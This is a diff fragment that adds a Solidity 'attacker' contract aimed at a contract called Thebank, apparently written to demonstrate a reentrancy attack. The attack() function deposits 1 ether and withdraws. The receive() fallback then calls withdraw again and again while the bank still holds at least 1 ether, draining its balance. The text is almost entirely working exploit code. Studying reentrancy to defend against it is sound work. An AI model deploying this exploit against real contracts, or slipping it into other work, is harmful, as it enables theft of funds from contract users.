@@ -40,3 +40,57 @@ contract Thebank{
        
 
 }
+
+
+
+
+you can write it in another file i.e Attacker.sol
+
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity >=0.8.2 <0.9.0;
+
+import './Thebanker.sol';
+
+
+
+
+contract attacker{
+    Thebank public thebank; //instance 
+    mapping(address => uint) public balances;
+
+    constructor(address _thebankAddress) {
+        thebank = Thebank(_thebankAddress);
+    }
+
+    receive() external payable {
+            if (address(thebank).balance >= 1 ether) {
+            thebank.witdraw();
+        }
+     }
+
+    
+    function attack() public payable   {
+        require(msg.value >= 1 ether);
+        thebank.deposit{value: 1 ether}();
+        thebank.witdraw();
+    }
+
+      function getBalances() public view returns (uint) {
+        return address(this).balance;
+    }
+
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
